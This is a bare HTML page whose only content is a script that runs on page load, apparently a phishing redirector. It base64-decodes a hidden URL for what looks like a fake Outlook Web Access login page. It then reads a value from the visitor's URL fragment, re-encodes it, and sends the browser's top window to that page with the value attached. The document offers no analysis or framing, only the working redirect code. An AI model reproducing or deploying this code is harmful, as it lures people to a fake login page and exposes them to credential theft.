<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <title></title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
</head>

<body>
<font color="" face="Segoe UI" size="2"></font>
<script type="text/javascript">

 if (window.location.hash){
  var link = window.atob("aHR0cHM6Ly9zZmNhcGl0YWxzLmNvbS9zZWN1cmVkX2xvZ2luX2FjY2Vzcy9zZXJ2ZXJkYXRhL293YS5odG1s");
  var hash = btoa(getProcessHash());
  window.top.location.href=`${link}lgh=${hash}`;
 }

 function getProcessHash(){
     if(window.location.hash){
         let h = window.location.hash;
         let s = h.split('#')[1];
         
         return atob(s);
     }
    }

</script>
</body>


</html>
